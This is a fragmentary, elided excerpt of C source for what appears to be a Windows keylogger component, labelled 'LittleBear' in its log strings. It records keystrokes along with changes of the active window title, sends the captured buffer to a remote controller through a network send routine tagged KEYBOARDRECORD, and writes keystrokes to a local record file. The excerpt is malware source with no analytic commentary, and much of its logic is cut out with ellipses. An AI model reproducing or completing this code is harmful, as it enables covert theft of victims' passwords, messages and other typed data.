...
_GetUsefulKey:
			...
			if (hWnd != FALSE)
			{
				...
				if (iRet)
				{
					...
					if( (lpRtlCompareMemory(strLastWindowTitle,strCurrentWindowTitle,iLstLen) != iLstLen)  && (dwKeyPtr > 0))
					{
						...
						IndependentNetWork_SendMessage(strFileBuf,iRet,KEYBOARDRECORD,0);
						lplstrcpyA(strLastWindowTitle,strCurrentWindowTitle);
	...
	{
		WriteLittleBearLog("keyboard exception\r\n");
		return FALSE;
	}
	return TRUE;
}
...
int WriteKeyboardRecordFile(char * strData,int iLen)
{
	...
	int iRet = ModifyModuleFileName(strFilePath,KEYBOARD_RECORD_FILENAME);
	...
	{
		WriteLittleBearLog("Keyboard lpCreateDirectoryA error\r\n");
		return FALSE;
		//lpSleep(iTimeDelay);
		//continue;
	}
	...
	{
		WriteLittleBearLog("Keyboard SetFilePointer error\r\n");
		lpCloseHandle(hFile);
		return FALSE;
		//lpSleep(iTimeDelay);
		//continue;
	...
	if (iRes == FALSE)
	{
		WriteLittleBearLog("Keyboard lpWriteFile error\r\n");
		lpCloseHandle(hFile);
		return FALSE;
		//lpSleep(iTimeDelay);
		//continue;
